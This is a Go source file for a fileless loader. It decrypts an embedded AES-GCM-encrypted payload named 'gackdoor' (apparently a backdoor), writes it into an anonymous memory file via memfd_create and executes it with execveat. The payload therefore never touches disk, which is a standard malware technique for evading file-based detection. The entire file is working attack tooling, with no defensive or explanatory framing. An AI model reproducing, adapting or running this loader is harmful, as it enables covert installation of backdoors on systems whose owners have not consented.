package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"log"
	"syscall"
	"unsafe"
)

// Functions for memory execution graciously provided this link
// https://0xcf9.org/2021/06/22/embed-and-execute-from-memory-with-golang/
func MemfdCreate(path string) (r1 uintptr, err error) {
	s, err := syscall.BytePtrFromString(path)
	if err != nil {
		return 0, err
	}

	r1, _, errno := syscall.Syscall(319, uintptr(unsafe.Pointer(s)), 0, 0)

	if int(r1) == -1 {
		return r1, errno
	}

	return r1, nil
}

func CopyToMem(fd uintptr, buf []byte) (err error) {
	_, err = syscall.Write(int(fd), buf)
	if err != nil {
		return err
	}

	return nil
}

func ExecveAt(fd uintptr) (err error) {
	s, err := syscall.BytePtrFromString("")
	if err != nil {
		return err
	}
	ret, _, errno := syscall.Syscall6(322, fd, uintptr(unsafe.Pointer(s)), 0, 0, 0x1000, 0)
	if int(ret) == -1 {
		return errno
	}

	// never hit
	log.Println("should never hit")
	return err
}

func decryptFile(enc, key []byte) []byte {
	c, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(c)
	nonce := enc[:gcm.NonceSize()]
	ct := enc[gcm.NonceSize():]
	file, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		println(err.Error())
	}
	return file
}

//go:embed "encGack"
var encryptedGackdoor []byte

func main() {
	key := encryptedGackdoor[:32]
	ct := encryptedGackdoor[32:]
	payload := decryptFile(ct, key)
	fd, err := MemfdCreate("/gackdoor")
	if err != nil {
		log.Fatal(err)
	}

	err = CopyToMem(fd, payload)
	if err != nil {
		log.Fatal(err)
	}

	err = ExecveAt(fd)
	if err != nil {
		log.Fatal(err)
	}
}
